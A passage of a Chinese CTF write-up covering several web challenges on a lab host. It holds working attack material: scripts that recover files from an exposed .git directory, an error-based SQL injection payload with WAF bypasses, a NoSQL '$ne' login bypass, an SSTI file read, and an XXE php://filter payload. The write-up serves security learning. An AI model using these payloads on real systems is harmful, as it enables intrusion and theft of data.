class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">                        file_data = download_object(hash_val)</span><br><span class="line">                        <span class="keyword">if</span> file_data:</span><br><span class="line">                            save_file(<span class="string">f&quot;parent_version_<span class="subst">&#123;name&#125;</span>&quot;</span>, file_data)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 下载所有文件以便检查</span></span><br><span class="line">                    file_data = download_object(hash_val)</span><br><span class="line">                    <span class="keyword">if</span> file_data:</span><br><span class="line">                        save_file(<span class="string">f&quot;recovered_<span class="subst">&#123;name&#125;</span>&quot;</span>, file_data)</span><br><span class="line">                        </span><br><span class="line">                <span class="comment"># 4. 对比当前tree</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[*] 下载当前tree...&quot;</span>)</span><br><span class="line">                current_tree_data = download_object(<span class="string">&quot;d8ee21ae894000b6ef5b3160ec9c95a66419d35b&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> current_tree_data:</span><br><span class="line">                    current_files = parse_tree(current_tree_data)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] 当前tree中的文件 (<span class="subst">&#123;<span class="built_in">len</span>(current_files)&#125;</span>个):&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> name, hash_val <span class="keyword">in</span> current_files:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;  - <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 找出被删除的文件</span></span><br><span class="line">                    parent_file_names = [name <span class="keyword">for</span> name, _ <span class="keyword">in</span> parent_files]</span><br><span class="line">                    current_file_names = [name <span class="keyword">for</span> name, _ <span class="keyword">in</span> current_files]</span><br><span class="line">                    deleted_files = <span class="built_in">set</span>(parent_file_names) - <span class="built_in">set</span>(current_file_names)</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> deleted_files:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 发现被删除的文件: <span class="subst">&#123;deleted_files&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;    这些文件可能包含flag!&quot;</span>)</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># 下载被删除的文件</span></span><br><span class="line">                        <span class="keyword">for</span> name, hash_val <span class="keyword">in</span> parent_files:</span><br><span class="line">                            <span class="keyword">if</span> name <span class="keyword">in</span> deleted_files:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">f&quot;[*] 恢复被删除的文件: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">                                file_data = download_object(hash_val)</span><br><span class="line">                                <span class="keyword">if</span> file_data:</span><br><span class="line">                                    save_file(<span class="string">f&quot;deleted_<span class="subst">&#123;name&#125;</span>&quot;</span>, file_data)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="operator">*</span>] 下载parent commit...</span><br><span class="line">C:\Users\legen\AppData\<span class="keyword">Local</span>\Programs\Python\Python314\Lib\site<span class="operator">-</span>packages\urllib3\connectionpool.py:<span class="number">1097</span>: InsecureRequestWarning: Unverified HTTPS request <span class="keyword">is</span> being made <span class="keyword">to</span> host <span class="string">&#x27;eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com&#x27;</span>. Adding certificate verification <span class="keyword">is</span> strongly advised. See: https:<span class="operator">/</span><span class="operator">/</span>urllib3.readthedocs.io<span class="operator">/</span>en<span class="operator">/</span>latest<span class="operator">/</span>advanced<span class="operator">-</span>usage.html#tls<span class="operator">-</span>warnings  </span><br><span class="line">  warnings.warn(</span><br><span class="line">[<span class="operator">+</span>] Parent <span class="keyword">commit</span>内容:</span><br><span class="line"><span class="keyword">commit</span> <span class="number">167</span>tree <span class="number">9200</span>f5c08a0c6986fba9b48664ca87016d8c6702</span><br><span class="line">author dev <span class="operator">&lt;</span>dev<span class="variable">@example</span>.com<span class="operator">&gt;</span> <span class="number">1704067200</span> <span class="operator">+</span><span class="number">0000</span></span><br><span class="line">committer dev <span class="operator">&lt;</span>dev<span class="variable">@example</span>.com<span class="operator">&gt;</span> <span class="number">1704067200</span> <span class="operator">+</span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Initial</span> <span class="keyword">commit</span> <span class="keyword">with</span> flag</span><br></pre></td></tr></table></figure>
+
+<p>找到了 Parent commit 的 tree 哈希: <code>9200f5c08a0c6986fba9b48664ca87016d8c6702</code></p>
+<p>并发现这个提交包含 flag</p>
+<p>接着用命令行下载 parent tree</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k <span class="string">&quot;https://eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/.git/objects/92/00f5c08a0c6986fba9b48664ca87016d8c6702&quot;</span> -o parent_tree.bin</span><br></pre></td></tr></table></figure>
+
+<p>解压 parent tree 中文件，注意文件路径</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取并解压tree文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:\\Users\\legen\\Desktop\\CTF\\GitHack-master\\GitHack-master\\eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com_80\\parent_tree.bin&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    compressed_data = f.read()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 解压git对象</span></span><br><span class="line">    decompressed = zlib.decompress(compressed_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解压后大小: <span class="subst">&#123;<span class="built_in">len</span>(decompressed)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析tree对象</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n解析tree中的文件:&quot;</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    file_count = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(decompressed):</span><br><span class="line">        <span class="comment"># 找到mode和文件名结束的位置（null字节）</span></span><br><span class="line">        null_pos = decompressed.find(<span class="string">b&#x27;\x00&#x27;</span>, i)</span><br><span class="line">        <span class="keyword">if</span> null_pos == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提取mode和文件名</span></span><br><span class="line">        mode_name_part = decompressed[i:null_pos]</span><br><span class="line">        mode_name = mode_name_part.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提取文件的哈希值（20字节）</span></span><br><span class="line">        hash_start = null_pos + <span class="number">1</span></span><br><span class="line">        hash_end = hash_start + <span class="number">20</span></span><br><span class="line">        <span class="keyword">if</span> hash_end &gt; <span class="built_in">len</span>(decompressed):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">        file_hash = decompressed[hash_start:hash_end].<span class="built_in">hex</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印文件信息</span></span><br><span class="line">        parts = mode_name.split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">2</span>:</span><br><span class="line">            mode = parts[<span class="number">0</span>]</span><br><span class="line">            filename = parts[<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;file_count+<span class="number">1</span>&#125;</span>. <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;     模式: <span class="subst">&#123;mode&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;     哈希: <span class="subst">&#123;file_hash&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 检查是否是flag相关文件</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> filename.lower():</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;     [!] 可能是flag文件!&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            file_count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 移动到下一个文件</span></span><br><span class="line">        i = hash_end</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n总共找到 <span class="subst">&#123;file_count&#125;</span> 个文件&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">except</span> zlib.error <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解压错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原始数据 (hex):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(compressed_data.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
+
+<p>发现 flag.txt</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="number">141</span></span><br><span class="line">     模式: tree</span><br><span class="line">     哈希: <span class="number">31303036343420524541444</span>d452e6d64000a082b</span><br><span class="line">  <span class="number">2</span>. flag.txt</span><br><span class="line">     模式: U9Dǔ=DF100644</span><br><span class="line">     哈希: ab078900450d5762f3b36198022b74d6118895c3</span><br><span class="line">     [!] 可能是flag文件!</span><br><span class="line">  <span class="number">3</span>. index.html</span><br><span class="line">     模式: <span class="number">100644</span></span><br><span class="line">     哈希: <span class="number">1014</span>bc8db48a5a5d50f31ca65b36811f76da6ac2</span><br><span class="line">  <span class="number">4</span>. src</span><br><span class="line">     模式: <span class="number">40000</span></span><br><span class="line">     哈希: <span class="number">74</span>fe698dd5878438ac56483c6401604ad44ddb6e</span><br></pre></td></tr></table></figure>
+
+<p>输入 flag.txt 的哈希值，利用脚本阅读，即得答案</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag.txt的文件哈希</span></span><br><span class="line">file_hash = <span class="string">&quot;ab078900450d5762f3b36198022b74d6118895c3&quot;</span></span><br><span class="line">url = <span class="string">f&quot;https://eci-2ze3hhnmkjgcglt4e639.cloudeci1.ichunqiu.com/.git/objects/<span class="subst">&#123;file_hash[:<span class="number">2</span>]&#125;</span>/<span class="subst">&#123;file_hash[<span class="number">2</span>:]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 下载flag.txt...&quot;</span>)</span><br><span class="line">response = requests.get(url, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 下载成功，大小: <span class="subst">&#123;<span class="built_in">len</span>(response.content)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 解压git对象</span></span><br><span class="line">        decompressed = zlib.decompress(response.content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 解压后大小: <span class="subst">&#123;<span class="built_in">len</span>(decompressed)&#125;</span> 字节&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># git对象格式: &quot;blob &lt;size&gt;\x00&lt;content&gt;&quot;</span></span><br><span class="line">        <span class="comment"># 找到null字节分隔符</span></span><br><span class="line">        null_pos = decompressed.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> null_pos != -<span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 提取实际文件内容</span></span><br><span class="line">            file_content = decompressed[null_pos+<span class="number">1</span>:]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag.txt 内容:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">            <span class="built_in">print</span>(file_content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 无法解析文件格式&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;原始数据:&quot;</span>, decompressed[:<span class="number">100</span>])</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> zlib.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 解压错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;原始数据 (hex):&quot;</span>, response.content[:<span class="number">50</span>].<span class="built_in">hex</span>())</span><br><span class="line">        </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] 下载失败: HTTP <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/WYubb3anLoKutexenClcQZwnnYb.png"></p>
+<h2 id="问题-5-SQL-注入-EZSQL"><a href="#问题-5-SQL-注入-EZSQL" class="headerlink" title="[问题 5&#x2F;SQL 注入] EZSQL"></a>[问题 5&#x2F;SQL 注入] EZSQL</h2><p>判断闭合方式为单引号</p>
+<p><img src="/images/M1HWb0AoWo6375xNcnAcukw8nWh.png"></p>
+<p>通过试错，发现表名为 flag，列名为 flag，采用报错注入并用以下方法绕过 WAF:</p>
+<p>|| 绕过 or;</p>
+<p>&#96; 绕过空格</p>
+<p>‘||EXTRACTVALUE(2,CONCAT(‘~’,(SUBSTR((SELECT <code>flag</code> FROM <code>flag</code>),1,30))))||’</p>
+<p><img src="/images/XgQpbw2wuoEGZ1xoQwVcFhzYnvc.png"></p>
+<p>‘||EXTRACTVALUE(2,CONCAT(‘~’,(SUBSTR((SELECT(SELECT <code>flag</code> FROM <code>flag</code>)FROM <code>flag</code>),16,30))))||’</p>
+<p><img src="/images/VWO1bGbEyoDyOXx6HZtcgowTnSe.png"></p>
+<h3 id="做题启示-2"><a href="#做题启示-2" class="headerlink" title="做题启示"></a>做题启示</h3><p>1.|| 绕过 or;</p>
+<p>2.&#96; 绕过空格</p>
+<p>3.SUBSTR 打破限制</p>
+<h2 id="问题-6-NoSQL-注入-NoSQL-Login"><a href="#问题-6-NoSQL-注入-NoSQL-Login" class="headerlink" title="[问题 6&#x2F;NoSQL 注入] NoSQL_Login"></a>[问题 6&#x2F;NoSQL 注入] NoSQL_Login</h2><p>用户名:admin</p>
+<p>密码:{“$ne”: null</p>
+<p>登录即得答案</p>
+<p><img src="/images/NTU6bFhGOoBVdrx0TE3cVQQ5n8c.png"></p>
+<h2 id="问题-7-观察-cookie-CORS"><a href="#问题-7-观察-cookie-CORS" class="headerlink" title="[问题 7&#x2F;观察 cookie] CORS"></a>[问题 7&#x2F;观察 cookie] CORS</h2><p>点击 Check My Salary，用 Burp 抓包</p>
+<p><img src="/images/Uz3BbDamEoHuYPx1RH0cjVs1nbc.png"></p>
+<p>发现 cookie 为 base64 编码，解码即得 flag</p>
+<p><img src="/images/SUZrbiIhioFw93xoIf5crfY0nbg.png"></p>
+<p><img src="/images/IiGlbggloofwcXxzpC3c7LFznBd.png"></p>
+<h3 id="做题启示-3"><a href="#做题启示-3" class="headerlink" title="做题启示"></a>做题启示</h3><p>观察请求头和响应头的 HTTP 题是真的出现了好多好多次了，比想象中的要高频</p>
+<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><h2 id="问题-1-基础-SSTI-Hello-User"><a href="#问题-1-基础-SSTI-Hello-User" class="headerlink" title="[问题 1&#x2F;基础 SSTI] Hello User"></a>[问题 1&#x2F;基础 SSTI] Hello User</h2><p>SSTI</p>
+<p><img src="/images/JL9Kb2YP1oq3kaxmjlDcVgcPnvb.png"></p>
+<p>用 fenjing 连接，输入 ls 看到 flag.txt</p>
+<p><img src="/images/Un2EbgWCToNtM7xrMl3cYrYVn4b.png"></p>
+<p>cat &#x2F;fl*带出来即可</p>
+<p><img src="/images/MQxhbUQ6Sofz4mxASH4cUeylnOm.png"></p>
+<h2 id="问题-2-基础-XXE-RSS-Parser"><a href="#问题-2-基础-XXE-RSS-Parser" class="headerlink" title="[问题 2&#x2F;基础 XXE] RSS_Parser"></a>[问题 2&#x2F;基础 XXE] RSS_Parser</h2><p>进入网站，为 xml 解析器</p>
+<p><img src="/images/N6EzbNDzXoIN8KxfuQRcUdvWnEe.png"></p>
+<p>尝试按格式输 XML，读 flag</p>
+<p><img src="/images/JEjhbT5hToIdf5xy0m7cLxujn6c.png"></p>
+<p>无果，后面用目录遍历等方式，仍然无果</p>
+<p><img src="/images/LsJbbrLMfodslzxLsfwc2YOonmf.png"></p>
+<p>有显示主页的路径，于是尝试读主页源码</p>
+<p><img src="/images/Zhclbz3sVoagnDxbHxuc2kz1nBe.png"></p>
+<p>仍然报错，于是想到用 file 协议读，主页 php 文件的内部脚本很可能会因为执行发生错误</p>
+<p>我们改用 php 方式读取</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">src</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/index.php&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">src</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/index.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="symbol">&amp;src;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到源码，在第十行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [@attributes] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [version] =&gt; <span class="number">2.0</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [channel] =&gt; SimpleXMLElement <span class="title function_ invoke__">Object</span></span><br><span class="line">        (</span><br><span class="line">            [title] =&gt; PD9waHAKJEZMQUcgPSBnZXRlbnYoJ0lDUV9GTEFHJykgPzogJ2ZsYWd7dGVzdF9mbGFnfSc7CmZpbGVfcHV0X2NvbnRlbnRzKCcvdG1wL2ZsYWcudHh0JywgJEZMQUcpOwo/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWw+CjxoZWFkPgogICAgPHRpdGxlPlJTUyBQYXJzZXI8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkgeyBmb250LWZhbWlseTogQXJpYWw7IG1heC13aWR0aDogODAwcHg7IG1hcmdpbjogNTBweCBhdXRvOyBwYWRkaW5nOiAyMHB4OyB9CiAgICAgICAgdGV4dGFyZWEgeyB3aWR0aDogMTAwJTsgaGVpZ2h0OiAyMDBweDsgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsgfQogICAgICAgIGJ1dHRvbiB7IHBhZGRpbmc6IDEwcHggMjBweDsgYmFja2dyb3VuZDogIzAwN2JmZjsgY29sb3I6IHdoaXRlOyBib3JkZXI6IG5vbmU7IGN1cnNvcjogcG9pbnRlcjsgfQogICAgICAgIC5yZXN1bHQgeyBtYXJnaW4tdG9wOiAyMHB4OyBwYWRkaW5nOiAxNXB4OyBiYWNrZ3JvdW5kOiAjZjVmNWY1OyBib3JkZXItcmFkaXVzOiA1cHg7IH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgICA8aDE+<span class="number">8</span>J+ToSBSU1MgRmVlZCBQYXJzZXI8L2gxPgogICAgPHA+U3VibWl0IHlvdXIgUlNTIGZlZWQgVVJMIGFuZCB3ZSdsbCBwYXJzZSBpdCBmb3IgeW91ITwvcD4KICAgIAogICAgPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICA8aDM+UlNTIEZlZWQgWE1MOjwvaDM+CiAgICAgICAgPHRleHRhcmVhIG5hbWU9InJzcyIgcGxhY2Vob2xkZXI9IlBhc3RlIHlvdXIgUlNTIFhNTCBoZXJlLi4uIj48L3RleHRhcmVhPgogICAgICAgIDxicj48YnI+CiAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPlBhcnNlIFJTUzwvYnV0dG9uPgogICAgPC9mb3JtPgogICAgCiAgICA8P3BocAogICAgaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcgJiYgaXNzZXQoJF9QT1NUWydyc3MnXSkpIHsKICAgICAgICAkcnNzX2NvbnRlbnQgPSAkX1BPU1RbJ3JzcyddOwogICAgICAgIAogICAgICAgIGVjaG8gJzxkaXYgY2xhc3M9InJlc3VsdCI+JzsKICAgICAgICBlY2hvICc8aDM+UGFyc2luZyBSZXN1bHQ6PC9oMz4nOwogICAgICAgIAogICAgICAgIC8vIOa8j+a0nuS7o+egge+<span class="number">8</span>muacquemgeeUqOWklumDqOWunuS9kwogICAgICAgIGxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIoZmFsc2UpOwogICAgICAgIAogICAgICAgIHRyeSB7CiAgICAgICAgICAgICR4bWwgPSBzaW1wbGV4bWxfbG9hZF9zdHJpbmcoJHJzc19jb250ZW50LCAnU2ltcGxlWE1MRWxlbWVudCcsIExJQlhNTF9OT0VOVCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoJHhtbCA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgIGVjaG8gJzxwIHN0eWxlPSJjb2xvcjpyZWQiPkZhaWxlZCB0byBwYXJzZSBYTUwhPC9wPic7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBlY2hvICc8cCBzdHlsZT0iY29sb3I6Z3JlZW4iPlJTUyBwYXJzZWQgc3VjY2Vzc2Z1bGx5ITwvcD4nOwogICAgICAgICAgICAgICAgZWNobyAnPHByZT4nIC4gaHRtbHNwZWNpYWxjaGFycyhwcmludF9yKCR4bWwsIHRydWUpKSAuICc8L3ByZT4nOwogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7CiAgICAgICAgICAgIGVjaG8gJzxwIHN0eWxlPSJjb2xvcjpyZWQiPkVycm9yOiAnIC4gaHRtbHNwZWNpYWxjaGFycygkZS0+Z2V0TWVzc2FnZSgpKSAuICc8L3A+JzsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgZWNobyAnPC9kaXY+JzsKICAgIH0KICAgID8+CiAgICAKICAgIDxkaXYgc3R5bGU9Im1hcmdpbi10b3A6IDMwcHg7IHBhZGRpbmc6IDE1cHg7IGJhY2tncm91bmQ6ICNmZmYzY2Q7IGJvcmRlci1sZWZ0OiA0cHggc29saWQgI2ZmYzEwNzsiPgogICAgICAgIDxzdHJvbmc+<span class="number">8</span>J+SoSBIaW50Ojwvc3Ryb25nPiBUaGlzIHBhcnNlciBhY2NlcHRzIGFueSB2YWxpZCBYTUwvUlNTIGZvcm1hdC4gCiAgICAgICAgWE1MIGNhbiBiZSB2ZXJ5IHBvd2VyZnVsLi4uIG1heWJlIHRvbyBwb3dlcmZ1bD8KICAgIDwvZGl2PgogICAgCiAgICA8ZGl2IHN0eWxlPSJtYXJnaW4tdG9wOiAxNXB4OyBwYWRkaW5nOiAxNXB4OyBiYWNrZ3JvdW5kOiAjZDFlY2YxOyBib3JkZXItbGVmdDogNHB4IHNvbGlkICMxN2EyYjg7Ij4KICAgICAgICA8c3Ryb25nPkV4YW1wbGUgUlNTOjwvc3Ryb25nPgogICAgICAgIDxwcmU+Jmx0Oz94bWwgdmVyc2lvbj0iMS4wIj8mZ3Q7CiZsdDtyc3MgdmVyc2lvbj0iMi4wIiZndDsKICAmbHQ7Y2hhbm5lbCZndDsKICAgICZsdDt0aXRsZSZndDtNeSBGZWVkJmx0Oy90aXRsZSZndDsKICAgICZsdDtpdGVtJmd0OwogICAgICAmbHQ7dGl0bGUmZ3Q7VGVzdCBJdGVtJmx0Oy90aXRsZSZndDsKICAgICZsdDsvaXRlbSZndDsKICAmbHQ7L2NoYW5uZWwmZ3Q7CiZsdDsvcnNzJmd0OzwvcHJlPgogICAgPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>对其解码，获得头部关键信息</p>
+<p><img src="/images/ChaqbwvLNonEPLxluAlcL8DYnZc.png"></p>
+<p>访问正确的路由并解码。即得答案</p>
